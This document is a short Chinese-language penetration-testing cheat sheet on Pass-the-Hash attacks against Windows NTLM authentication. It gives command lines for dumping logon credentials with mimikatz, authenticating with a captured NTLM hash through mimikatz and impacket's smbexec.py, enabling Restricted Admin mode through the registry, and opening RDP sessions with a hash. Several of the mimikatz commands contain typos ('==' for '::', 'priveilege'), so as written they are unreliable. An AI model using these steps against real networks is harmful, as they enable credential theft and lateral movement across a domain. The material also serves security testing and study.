# 哈希传递

**关于PTH(Pass The Hash )**

* 针对NTLM协议的攻击技术
* NTLM第三步身份证认证生成Response时，客户端直接使用NTLM哈希值进行计算，用户明文密码不参与
* 当测试人员获取有效的用户名和密码哈希值后，就能直使用该信息对远程主机进行身份认证
* 在域环境中哈希传递往往开业批量获取内网主机权限

**Mimikatz PTH**

获取Administrator NTLM

```
mimikatz.exe "privilege==debug" "sekurlsa==logonpasswords full" exit
```

利用域管理的NTLM hash进行哈希传递

```
mimikatz.exe "priveilege==debug" "sekurlsa==pth /user:Administrator /domain:hack-my.com /ntlm:a8f33bee89eba84d289ab51248f1534b" exit
```

**impacket项目 PTH**

\-hashes 指定用户完成哈希值，如果LM hash被废弃，则指定

```
python3 smbexec.py -hashes :a8f33bee89eba84d289ab51248f1534b Administrator@192.168.0.104
```

**PTH实现远程桌面**

* 需要远程主机开启受限管理员模式
* 需要登录远程桌面用户位于远程主机管理员组中
* 目标用户哈希
* Windows server2012 R2及以上版本采用了新版RDP，支持首先管理员模式，开启该模式后测试人员可以通过哈希传递直接登录
* 受限管理员模式默认在Windows 8.1和WIndow Server2012 R2上默认开启

手动开启受限者模式

```
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
```

mimikatz利用哈希船体执行 "mstsc.exe /restrictedadmin"命令，以受限管理员身份登录

```
mimikatz.exe 
privilege::debug 
sekurlsa::pth /user:Administrator /domain:hack-my /ntlm:a8f33bee89eba84d289ab51248f1534b "/run:mstsc.exe /restrictedadmin"
```
